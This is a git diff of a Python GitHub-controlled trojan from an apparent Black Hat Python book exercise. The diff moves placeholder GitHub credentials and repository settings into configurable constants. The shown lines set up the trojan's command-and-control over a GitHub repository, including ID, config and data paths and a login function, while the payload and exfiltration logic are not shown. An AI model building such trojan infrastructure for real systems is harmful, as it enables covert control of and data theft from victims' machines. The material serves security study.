@@ -1,9 +1,16 @@
 import json, base64, sys, time, imp, random, threading, os, encodings.idna
-from github_login import GH_USERNAME, GH_PASSWORD
 from queue import Queue
 from github3 import login
 
-trojan_id = "abc" # unique id for this trojan
+#### CONFIGURE YOUR SETTINGS HERE ####
+GH_USERNAME = '<YOUR GITHUB USERNAME>'
+GH_PASSWORD = '<YOUR GITHUB PASSWORD>'
+OWNER = 'iluxonchik'
+REPOSITORY = 'blackhat-python-book'
+BRANCH = 'master'
+######################################
+
+trojan_id = "abc"  # unique id for this trojan
 relative_path = "Chapter_07/trojan/"
 trojan_config = relative_path + "config/{0}.json".format(trojan_id)
 data_path = relative_path + "data/{0}/".format(trojan_id)
@@ -12,9 +19,10 @@ configured = False
 task_queue = Queue()
 
 def connect_to_github():
-	gh = login(username=GH_USERNAME, password=GH_PASSWORD) # there is also an option to login via tokens
-	repo = gh.repository("iluxonchik", "blackhat-python-book")
-	branch = repo.branch("master")
+	# NOTE: there is also an option to login via tokens (see docs for more info)
+	gh = login(username=GH_USERNAME, password=GH_PASSWORD)
+	repo = gh.repository(OWNER, REPOSITORY)
+	branch = repo.branch(BRANCH)
 
 	return gh, repo, branch
 
